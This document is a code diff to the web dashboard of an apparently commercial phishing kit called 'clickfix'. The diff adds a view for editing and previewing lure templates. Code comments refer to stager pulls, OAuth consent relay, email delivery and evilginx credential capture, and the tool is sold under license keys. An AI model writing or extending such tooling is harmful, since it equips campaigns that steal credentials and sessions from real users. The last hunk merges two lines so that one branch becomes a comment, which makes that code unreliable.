@@ -276,6 +276,7 @@ tr.flash { animation: flash .9s ease; }
     <button data-v="dash" class="active"><i>◆</i>Dashboard</button>
     <button data-v="camps"><i>⬡</i>Campaigns</button>
     <button data-v="techs"><i>✧</i>Techniques</button>
+    <button data-v="packs"><i>⬢</i>Templates</button>
     <button data-v="serve"><i>◈</i>Landing</button>
     <button data-v="lic"><i>⚿</i>License</button>
   </nav>
@@ -433,7 +434,7 @@ tr.flash { animation: flash .9s ease; }
 <!-- ─── license ─── -->
 <section id="v-lic" class="view">
   <header class="view-head">
-    <div><h1>License</h1><p>offline-signed keys · hmac-sha256 · prefix CFIX1</p></div>
+    <div><h1>License</h1><p>offline Ed25519-signed keys · prefix CFIX2</p></div>
   </header>
 
   <div class="panel">
@@ -452,6 +453,34 @@ tr.flash { animation: flash .9s ease; }
         </div>
       </div>
     </form>
+  </div>
+</section>
+
+<section id="v-packs" class="view">
+  <header class="view-head">
+    <div><h1>Template packs</h1><p>edit · validate · preview — same schema, drop into ~/.clickfix/packs</p></div>
+  </header>
+
+  <div class="panel">
+    <div class="panel-head"><h2>Pack library</h2><span class="chip mono" id="pk-user-dir" title="user packs land here">—</span></div>
+    <div id="pk-list" class="dim">loading…</div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-head"><h2>Editor</h2>
+      <div class="btn-row">
+        <button class="btn ghost" onclick="previewPack()">Preview lure</button>
+        <button class="btn primary" onclick="savePack()">Validate + save</button>
+      </div>
+    </div>
+    <textarea id="pk-json" spellcheck="false" class="mono"
+      style="width:100%;min-height:26em;background:#0b0b12;color:#cfe3ff;border:1px solid #2a2a3a;border-radius:8px;padding:10px;font-size:12.5px"></textarea>
+    <div id="pk-msg" class="dim" style="margin-top:8px">pick a pack to load it raw — save writes it validated</div>
+  </div>
+
+  <div class="panel" id="pk-prev-panel" style="display:none">
+    <div class="panel-head"><h2>Lure preview — variant 1</h2></div>
+    <iframe id="pk-preview" style="width:100%;height:22em;border:1px solid #2a2a3a;border-radius:8px;background:#fff"></iframe>
   </div>
 </section>
 
@@ -559,6 +588,7 @@ function refreshView() {
   if (currentView === 'dash') loadDash();
   else if (currentView === 'camps') loadCamps();
   else if (currentView === 'techs') loadTechs();
+  else if (currentView === 'packs') loadPacks();
   else if (currentView === 'serve') { loadServe(); renderFeed(); }
   else if (currentView === 'lic') loadLic();
 }
@@ -694,9 +724,46 @@ async function openCamp(cid, silent) {
     if (!silent) $('camp-detail').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
   } catch (e) { if (!silent) toast(e.message, 'err'); }
 }
+// ─── template packs ───
+async function loadPacks() {
+  const data = await api('/packs');
+  $('pk-user-dir').textContent = data.user_dir;
+  $('pk-list').innerHTML = data.all.map(id =>
+    `<button class="chip mono ${data.builtin.includes(id) ? '' : 'ok'}"
+      style="cursor:pointer;margin:2px" onclick="packEdit('${attr(id)}')">
+      ${esc(id)}${data.builtin.includes(id) ? '' : ' ★'}</button>`
+  ).join(' ');
+}
+async function packEdit(id) {
+  const data = await api('/packs?id=' + encodeURIComponent(id));
+  $('pk-json').value = JSON.stringify(data.pack, null, 2);
+  $('pk-msg').textContent = `editing ${id} — save stores it as a user pack (shadows the builtin)`;
+}
+async function savePack() {
+  let obj;
+  try { obj = JSON.parse($('pk-json').value); }
+  catch (e) { $('pk-msg').textContent = 'invalid JSON: ' + e.message; return; }
+  const r = await fetch(`/api/packs?t=${TOKEN}`, { method: 'POST',
+    headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(obj) });
+  const data = await r.json();
+  $('pk-msg').textContent = r.ok
+    ? `saved → ${data.path} · variant 1 subject: ${data.subject}`
+    : 'rejected: ' + (data.error || r.status);
+  if (r.ok) loadPacks();
+}
+async function previewPack() {
+  let obj;
+  try { obj = JSON.parse($('pk-json').value); }
+  catch (e) { $('pk-msg').textContent = 'invalid JSON: ' + e.message; return; }
+  const r = await fetch(`/api/packs/preview?t=${TOKEN}`, { method: 'POST',
+    headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(obj) });
+  if (!r.ok) { $('pk-msg').textContent = 'rejected: ' + (await r.json()).error; return; }
+  $('pk-prev-panel').style.display = 'block';
+  $('pk-preview').srcdoc = await r.text();
+}
+
 function tlIcon(kind) {
-  if (kind.startsWith('stager:')) return '⌁';           // stager pull
-  if (kind.startsWith('oauth')) return '⚿';             // consent relay
+  if (kind.startsWith('stager:')) return '⌁';           // stager pull  if (kind.startsWith('oauth')) return '⚿';             // consent relay
   if (kind.startsWith('smtp:')) return '✉';             // inbox delivery
   if (kind.startsWith('proxy:')) return '⇄';            // evilginx capture
   return { lure: '🎣', pixel: '👁', hit: '⚡' }[kind] || '·';
